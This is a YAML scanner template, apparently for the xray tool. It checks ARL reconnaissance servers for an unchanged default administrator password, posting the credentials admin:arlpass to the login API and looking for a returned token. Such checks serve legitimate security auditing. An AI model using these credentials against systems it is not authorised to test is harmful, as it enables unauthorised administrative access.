name: poc-yaml-arl-default-password
rules:
  - method: GET
    path: "/api/user/login"
    expression: |
      "is not allowed for the requeste".bmatches(response.body)
  - method: POST
    path: "/api/user/login"
    headers:
      Content-Type: application/json; charset=UTF-8
    body: |
      {"username":"xxx","password":"xxxxxx1232"}
    expression: |
      "{\"message\": \"success\", \"code\": 401, \"data\": {}}".bmatches(response.body) && response.headers["Content-Type"].contains(string("application/json")) && response.status == 200
  - method: POST
    path: "/api/user/login"
    headers:
      Content-Type: application/json; charset=UTF-8
    body: |
      {"username":"admin","password":"arlpass"}
    expression: |
      "{\"username\": \"admin\", \"token\": ".bmatches(response.body) && response.headers["Content-Type"].contains(string("application/json")) && response.status == 200
detail:
  author: tangshoupu
  info: arl-default-password [admin:arlpass ]
  links:
    - https://github.com/TophantTechnology/ARL
